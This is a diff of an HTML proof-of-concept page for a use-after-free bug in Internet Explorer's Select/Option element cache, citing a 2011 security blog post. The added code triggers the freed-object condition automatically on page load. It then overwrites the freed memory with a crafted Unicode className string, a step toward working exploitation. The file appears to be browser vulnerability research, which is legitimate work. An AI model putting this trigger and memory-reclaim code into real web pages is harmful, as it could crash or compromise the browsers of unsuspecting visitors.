@@ -2,22 +2,42 @@
 <html>
 <head>
 <script>
+/*
+http://ifsec.blogspot.hu/2011/10/internet-explorer-option-element-remote.html
+
+In Internet Explorer, the implementation of Select HTML element contains an array of pointers to the Option elements the Select element contains. This array is called the Option cache. Normally, whenever an Option element inside a Select element is accessed via JavaScript, Option cache is rebuilt, thus ensuring its consistency. However, there are some JavaScript methods that can be used to delete and modify the Option elements contained inside the Select element without rebuilding the Option cache. In combination, these methods enable modifying a previously deleted Option element.
+*/
+
 function ivan()
 {
-var formobj, selobj, optobj;
- selobj = document.getElementById("select1");
- formobj = selobj.form;
-for(var i=0;i<5;i++) {
- optobj = document.createElement('option');
- optobj.text = "test";
- selobj.add(optobj);
- }
-selobj.innerText = "foo";
- CollectGarbage();
-formobj.reset();
+
+    Math.atan2(0xbadc0de, "obtaining reference to select and form")
+        var formobj, selobj, optobj;
+        selobj = document.getElementById("select1");
+        formobj = selobj.form;
+
+    Math.atan2(0xbadc0de, "adding options to select")
+        for(var i=0;i<5;i++) {
+                optobj = document.createElement('option');
+                optobj.text = "test";
+                selobj.add(optobj);
+        }
+
+    Math.atan2(0xbadc0de, "setting selects inner text - kill 'em all")
+        selobj.innerText = "foo";
+
+    CollectGarbage();
+    //formobj.className = "s2s2s2s2s2s2s2s2s2s2s2s2X";
+    formobj.className = "\u3f49\u4141s2s2s2s2s2s2s2s2s2s2s2s2X";
+	
+
+    Math.atan2(0xbadc0de, "reseting form")
+        formobj.reset();
 }
+
 </script>
 </head>
+
 <body onload='ivan()'>
 <form method="post">
 <select id="select1">
